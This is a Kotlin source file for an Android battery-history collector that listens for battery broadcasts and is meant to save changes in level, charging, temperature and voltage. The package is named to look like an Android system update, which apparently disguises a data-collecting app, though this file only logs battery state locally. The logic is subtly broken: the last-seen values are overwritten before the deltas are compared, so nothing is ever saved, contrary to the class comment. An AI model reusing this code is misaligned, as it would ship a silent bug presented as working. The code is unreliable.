package com.androidsystem.update.collector

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import com.androidsystem.update.database.BatteryEventEntity
import com.androidsystem.update.database.DataRepository
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Battery history collector.
 *
 * Watches ACTION_BATTERY_CHANGED and persists a row only on transitions
 * (level changed by >= 1%, or plugged changed, or temp/voltage moved by a
 * meaningful delta). The CoreService can read getCachedLevel() instead of
 * going through registerReceiver every heartbeat (the previous version
 * did exactly that — battery drain regression).
 */
@Singleton
class BatteryCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: DataRepository
) {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            if (intent?.action != Intent.ACTION_BATTERY_CHANGED) return
            val bm = ctx ?: context
            handle(intent, bm)
        }
    }

    @Volatile private var lastLevel: Int = -1
    @Volatile private var lastPlugged: Int = -1
    @Volatile private var lastTemp: Float = -1f
    @Volatile private var lastVoltage: Int = -1
    private var registered = false

    /** Cached level updated from the live broadcast — no registerReceiver per call. */
    fun getCachedLevel(): Int = if (lastLevel >= 0) lastLevel else readLevelOnce()

    /** Returns true once at least one battery broadcast has been observed. */
    fun isWarmedUp(): Boolean = lastLevel >= 0

    fun ensureRegistered() {
        if (registered) return
        try {
            context.registerReceiver(
                receiver,
                IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            )
            registered = true
        } catch (_: Exception) { /* ignore */ }
    }

    private fun handle(intent: Intent, ctx: Context) {
        val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        val norm = if (level >= 0 && scale > 0) (level * 100 / scale.toFloat()).toInt() else 0
        val plugged = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0)
        val temp = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1) / 10f
        val voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1)
        val health = mapHealth(intent.getIntExtra(BatteryManager.EXTRA_HEALTH, BatteryManager.BATTERY_HEALTH_UNKNOWN))
        lastLevel = norm
        lastPlugged = plugged
        lastTemp = temp
        lastVoltage = voltage

        val levelDelta = kotlin.math.abs(norm - lastLevel)
        val tempDelta = kotlin.math.abs(temp - lastTemp)
        val voltageDelta = kotlin.math.abs(voltage - lastVoltage)
        val meaningful = levelDelta >= 1 || plugged != lastPlugged || tempDelta >= 1.0f || voltageDelta >= 50
        if (!meaningful) return
        scope.launch {
            repository.insertBatteryEvent(
                BatteryEventEntity(
                    level = norm, plugged = plugged,
                    temperature = temp, voltage = voltage,
                    health = health, timestamp = System.currentTimeMillis()
                )
            )
        }
    }

    private fun readLevelOnce(): Int {
        val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level >= 0 && scale > 0) (level * 100 / scale.toFloat()).toInt() else 50
    }

    private fun mapHealth(h: Int): String = when (h) {
        BatteryManager.BATTERY_HEALTH_GOOD -> "good"
        BatteryManager.BATTERY_HEALTH_OVERHEAT -> "overheat"
        BatteryManager.BATTERY_HEALTH_DEAD -> "dead"
        BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "over_voltage"
        BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE -> "failure"
        BatteryManager.BATTERY_HEALTH_COLD -> "cold"
        else -> "unknown"
    }
}
